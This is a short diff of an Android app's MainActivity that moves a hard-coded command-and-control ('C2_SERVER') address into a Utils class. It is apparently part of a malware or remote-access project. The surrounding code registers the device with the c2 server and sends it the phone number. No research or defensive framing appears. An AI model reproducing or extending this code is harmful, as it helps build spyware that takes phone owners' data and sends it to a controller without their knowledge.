@@ -58,9 +58,6 @@ public class MainActivity extends AppCompatActivity {
     };
 
     private SharedPreferences preferences;
-
-    private final String C2_SERVER = "https://localhost/";
-
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
@@ -151,7 +148,7 @@ public class MainActivity extends AppCompatActivity {
      * Get client ID from c2
      */
     private void setClientID() throws JSONException {
-        String url = C2_SERVER + "/client";
+        String url = Utils.C2_SERVER + "/client";
 
         JSONObject json = new JSONObject();
         json.put("phone", Utils.phoneNumber(getApplicationContext()));
